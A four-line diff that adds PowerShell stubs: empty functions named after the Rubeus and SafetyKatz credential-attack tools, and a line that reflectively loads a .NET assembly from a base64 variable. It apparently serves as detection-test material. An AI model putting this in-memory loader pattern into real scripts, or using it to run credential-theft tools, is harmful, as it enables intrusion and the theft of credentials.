@@ -1,0 +1,4 @@
+function Invoke-Rubeus { }
+function Invoke-SafetyKatz { }
+[Reflection.Assembly]::Load([Convert]::FromBase64String($b))
+
